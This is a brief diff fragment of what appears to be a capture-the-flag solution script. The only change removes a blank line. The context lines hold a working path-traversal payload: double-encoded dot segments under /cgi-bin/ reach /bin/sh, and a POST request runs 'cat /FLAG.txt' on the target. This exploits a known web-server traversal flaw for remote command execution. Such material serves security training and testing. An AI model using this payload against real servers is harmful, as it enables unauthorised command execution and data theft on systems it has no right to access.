@@ -35,4 +35,3 @@ tricks:
       path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
       cmd = "echo; cat /FLAG.txt"
       resp = requests.post(f"{TARGET}{path}", data=cmd)
-
